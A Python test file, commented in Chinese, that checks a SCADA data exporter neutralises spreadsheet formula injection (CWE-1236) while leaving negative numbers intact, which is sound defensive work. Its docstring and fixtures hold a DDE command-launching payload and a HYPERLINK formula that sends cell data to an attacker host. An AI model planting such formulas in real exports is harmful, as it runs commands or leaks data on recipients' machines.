# -*- coding: utf-8 -*-
"""导出文件的**公式注入**防护（CWE-1236，round 223）。

缺陷
----
`存储层/data_export.py` 把数据原样写进 CSV / Excel。而设备名、寄存器名、单位
都是用户可填的 —— 只要某个值以 `=`（或 `+` / `-` / `@`）开头，导出文件用
Excel 打开时会被当成**公式**：

* `=cmd|'/C calc'!A0` —— 经典 DDE payload，可拉起进程；
* `=HYPERLINK("http://attacker/?d="&A1,"点我")` —— 把表格数据外带。

导出文件通常会被转发（发给同事、贴到群里、作为验收材料），等于把攻击面
带出了系统边界。

修法
----
`_sanitize_cell()`：以公式前缀开头的**字符串**前置一个单引号（OWASP 推荐做法）。

⚠️ **只处理字符串**，不处理数值 —— SCADA 数据里负数遍地（零下温度、反向功率），
对数值加引号会让 `-5.0` 变成文本，Excel 里再也算不了。修安全问题不能顺手把
数据搞坏。本文件同时钉住这两条：该中和的中和，不该动的别动。
"""

import csv

import pytest

from 存储层.data_export import DataExport, _sanitize_cell, _sanitize_rows


# ---------------------------------------------------------------------------
# 单元格级
# ---------------------------------------------------------------------------

@pytest.mark.parametrize('payload', [
    "=cmd|'/C calc'!A0",
    '=1+1',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
])
def test_sanitize_prefixes_formula_strings(payload):
    out = _sanitize_cell(payload)
    assert out.startswith("'"), f'{payload!r} 没被中和'
    assert out[1:] == payload, '只应前置单引号，内容不许改'


@pytest.mark.parametrize('value', [
    -5.0, -1, 0, 3.14, True, None,
    '温度', 'pump_01', '', 'a=b',
    # 字符串形态的纯负数也不是公式（与前端 escCSV 的判据一致）
    '-5', '-1.2', '-1.2e3', '-0.5E-2',
])
def test_sanitize_leaves_other_values_alone(value):
    """数值、正常字符串、空串、非字符串一律不动。"""
    assert _sanitize_cell(value) == value


def test_sanitize_rows_keeps_keys_and_order():
    rows = [{'register': '=bad', 'value': -3.5}, {'register': 'ok', 'value': 1}]
    out = _sanitize_rows(rows)
    assert [list(r.keys()) for r in out] == [['register', 'value'], ['register', 'value']]
    assert out[0]['register'] == "'=bad"
    assert out[0]['value'] == -3.5, '负数是合法数据，不许被当成公式前缀处理'


# ---------------------------------------------------------------------------
# CSV 落盘
# ---------------------------------------------------------------------------

def _rows_with_payload():
    return [
        {
            'device_id': 'dev1',
            'register_name': "=cmd|'/C calc'!A0",
            'value': -12.5,
            'unit': '℃',
            'timestamp': '2026-10-20 10:00:00',
        }
    ]


def test_csv_export_neutralizes_formula(tmp_path):
    exporter = DataExport(export_dir=str(tmp_path))
    path = exporter.export_csv(_rows_with_payload(), 'evil.csv')
    assert path, '导出失败'

    with open(path, encoding='utf-8-sig', newline='') as f:
        rows = list(csv.DictReader(f))

    cell = rows[0]['register_name']
    assert cell.startswith("'"), f'CSV 里仍是可执行公式: {cell!r}'
    assert cell.lstrip("'") == "=cmd|'/C calc'!A0", '中和时改坏了内容'
    # 负数必须原样（能参与计算），不能被引号变成文本
    assert rows[0]['value'] == '-12.5'


def test_csv_export_normal_data_unchanged(tmp_path):
    exporter = DataExport(export_dir=str(tmp_path))
    data = [{'device_id': 'dev1', 'register_name': 'temperature', 'value': 25.5}]
    path = exporter.export_csv(data, 'ok.csv')

    with open(path, encoding='utf-8-sig', newline='') as f:
        rows = list(csv.DictReader(f))

    assert rows[0]['register_name'] == 'temperature'
    assert rows[0]['value'] == '25.5'


# ---------------------------------------------------------------------------
# Excel 落盘（pandas → openpyxl 默认会把 '=' 开头的字符串写成公式）
# ---------------------------------------------------------------------------

def test_excel_export_neutralizes_formula(tmp_path):
    openpyxl = pytest.importorskip('openpyxl')
    pytest.importorskip('pandas')

    exporter = DataExport(export_dir=str(tmp_path))
    path = exporter.export_excel(_rows_with_payload(), 'evil.xlsx')
    assert path, '导出失败'

    wb = openpyxl.load_workbook(path)
    ws = wb.active
    header = [c.value for c in ws[1]]
    col = header.index('register_name') + 1
    cell = ws.cell(row=2, column=col)

    assert cell.data_type != 'f', 'Excel 单元格仍是公式类型（打开即执行）'
    assert str(cell.value).startswith("'"), f'Excel 里没中和: {cell.value!r}'
